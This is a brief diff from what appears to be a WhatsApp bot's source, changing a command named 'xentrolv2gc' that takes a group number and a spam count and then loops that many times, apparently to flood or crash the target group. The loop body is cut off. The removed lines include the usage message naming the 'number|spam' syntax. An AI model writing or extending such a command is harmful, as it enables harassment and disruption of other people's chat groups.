@@ -1076,8 +1076,6 @@ break
 
 case 'xentrolv2gc': {
  
-const qontol =  reSize(log0, 200, 200)
-if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|spam\nExample : ${command} 62888|1`)
 num = q.split('|')[0]+'@g.us'
 jumlah = q.split('|')[1]
 for (let i = 0; i < jumlah; i++) {
